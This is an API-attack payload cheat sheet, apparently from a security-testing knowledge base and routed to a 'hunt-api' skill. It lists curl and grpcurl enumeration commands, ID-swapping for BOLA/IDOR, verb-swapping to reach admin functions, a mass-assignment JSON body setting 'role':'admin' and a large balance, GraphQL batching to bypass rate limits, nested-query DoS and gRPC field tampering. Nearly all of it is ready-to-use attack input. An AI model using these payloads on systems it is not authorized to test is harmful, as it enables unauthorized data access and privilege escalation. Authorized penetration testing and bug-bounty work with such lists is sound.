---
title: "Payloads: API (REST / GraphQL / gRPC)"
type: payloads
tags: [payloads, api, bola, mass-assignment, graphql, grpc, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-06-16
---

# Payloads: API

BOLA/BFLA, mass assignment, and protocol-specific probes. Routed via the `hunt-api` skill. See [[api-security]], [[api-testing]]; GraphQL detail -> [[graphql]].

## Enumerate
```bash
# OpenAPI/Swagger -> every endpoint + param
curl -s https://t/openapi.json | jq '.paths|keys'
# GraphQL introspection
curl -s https://t/graphql -d '{"query":"{__schema{types{name fields{name}}}}"}'
# gRPC server reflection
grpcurl -plaintext t:443 list ; grpcurl -plaintext t:443 describe pkg.Service
```

## BOLA / IDOR (object-level)
```
swap IDs across accounts: /api/orders/1001 -> 1002 ; numeric, UUID, hashid
location: path, query, body, custom header (X-Account-Id), JWT claim
wrap/array: id=1002 -> id[]=1002 ; {"id":["self","victim"]}
```

## BFLA (function-level)
```
call admin methods as a low-priv user: POST /api/admin/... 
verb swap: GET->PUT/DELETE/PATCH ; /user/{id} GET allowed -> PUT to edit
undocumented endpoints from the spec / old versions: /api/v1 vs /api/v2 vs /internal
```

## Mass assignment (add fields the client never sends)
```json
{"username":"x","role":"admin","isAdmin":true,"verified":true,"balance":999999,"user_id":1}
```
Also try nested/`__proto__` and snake/camel variants (`is_admin`, `isAdmin`).

## Excessive data exposure
```
inspect RAW responses (not the UI) for extra fields / other users' data
filter/sort/fields params that return more: ?fields=*  ?include=all
```

## GraphQL specifics (see [[graphql]])
```
introspection ; batching/aliases (rate-limit/brute bypass) ; nested-query DoS ; field suggestion
```

## gRPC specifics
```bash
grpcurl -plaintext -d '{"id":1002}' t:443 pkg.Service/GetOrder    # tamper protobuf fields
# reflection off? extract the .proto from the client/jadx, then call methods directly
```

## Real-world
BOLA is OWASP API #1 and the dominant API bug-bounty finding; mass assignment (`role`/`isAdmin`) and BFLA verb-swaps are recurring privilege escalations.
